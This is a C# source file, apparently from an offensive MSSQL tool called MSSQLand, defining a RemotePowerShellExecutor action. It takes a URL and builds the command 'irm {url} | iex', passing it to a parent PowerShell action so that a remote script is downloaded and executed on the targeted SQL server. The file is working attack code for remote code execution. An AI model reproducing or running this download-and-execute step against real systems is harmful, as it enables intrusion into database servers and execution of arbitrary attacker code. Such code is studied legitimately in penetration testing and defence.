using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MSSQLand.Actions
{
    internal class RemotePowerShellExecutor : PowerShell
    {
        private string _url;

        /// <summary>
        /// Validates the arguments passed to the PowerShellScriptDownloader action.
        /// </summary>
        /// <param name="additionalArgument">The URL of the PowerShell script to download and execute.</param>
        public override void ValidateArguments(string additionalArgument)
        {
            if (string.IsNullOrEmpty(additionalArgument))
            {
                throw new ArgumentException("PowerShellScriptDownloader action requires a script URL.");
            }

            _url = additionalArgument;
        }

        /// <summary>
        /// Executes the PowerShell command to download and run the script from the provided URL.
        /// </summary>
        /// <param name="connectionManager">The ConnectionManager instance to execute the query.</param>
        public override void Execute(DatabaseContext connectionManager)
        {
            Logger.TaskNested($"Downloading and executing PowerShell script from URL: {_url}");

            // Craft the PowerShell command to download and execute the script
            string powerShellCommand = $"irm {_url} | iex";

            // Set the crafted PowerShell command as the _command in the parent class
            base.ValidateArguments(powerShellCommand);

            // Call the parent's Execute method to execute the command
            base.Execute(connectionManager);
        }
    }
}
